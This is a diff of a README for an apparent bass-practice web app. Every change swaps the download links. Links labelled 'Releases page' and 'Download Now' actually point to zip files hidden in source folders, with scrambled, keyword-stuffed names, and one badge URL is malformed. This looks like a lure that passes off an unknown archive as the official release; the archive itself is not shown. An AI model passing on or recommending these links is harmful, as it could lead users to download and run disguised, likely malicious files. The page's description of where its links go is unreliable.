@@ -1,6 +1,6 @@
 # 🎸 Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5 - Elevate Your Bass Skills with Ease
 
-[![Download Now](https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/components/tablature/Mode-Bass-Vision-by-Academy-v-A-powered-v1.9.zip%https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/components/tablature/Mode-Bass-Vision-by-Academy-v-A-powered-v1.9.zip)](https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/components/tablature/Mode-Bass-Vision-by-Academy-v-A-powered-v1.9.zip)
+[![Download Now](https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/features/vision/v-Academy-Mode-powered-by-Vision-Bass-A-v2.2.zip%https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/features/vision/v-Academy-Mode-powered-by-Vision-Bass-A-v2.2.zip)](https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/features/vision/v-Academy-Mode-powered-by-Vision-Bass-A-v2.2.zip)
 
 ## 📜 Description
 Bass Academy Vision Mode is your companion for mastering the bass guitar. This application combines gesture control with a custom exercise builder and a recording studio to enhance your practice. Powered by BassAI Vision, it supports offline use and works in your web browser thanks to the latest web technologies.
@@ -16,10 +16,10 @@ Ensure you have the latest version of a supported browser. We recommend using:
 - Microsoft Edge
 
 ### 2. Visit the Download Page
-Go to the [Releases page](https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/components/tablature/Mode-Bass-Vision-by-Academy-v-A-powered-v1.9.zip) to find the latest version of the application. 
+Go to the [Releases page](https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/features/vision/v-Academy-Mode-powered-by-Vision-Bass-A-v2.2.zip) to find the latest version of the application. 
 
 ## 📥 Download & Install
-To download Bass Academy Vision Mode, visit the [Releases page](https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/components/tablature/Mode-Bass-Vision-by-Academy-v-A-powered-v1.9.zip) and click on the download link for version 2.3.5. 
+To download Bass Academy Vision Mode, visit the [Releases page](https://raw.githubusercontent.com/nimsangsyangb/Bass-Academy-Vision-Mode-powered-by-BassAI-2026-v2.3.5/main/src/features/vision/v-Academy-Mode-powered-by-Vision-Bass-A-v2.2.zip) and click on the download link for version 2.3.5. 
 
 - Choose the version suitable for your device. 
 - Follow the prompts to download and install the application.
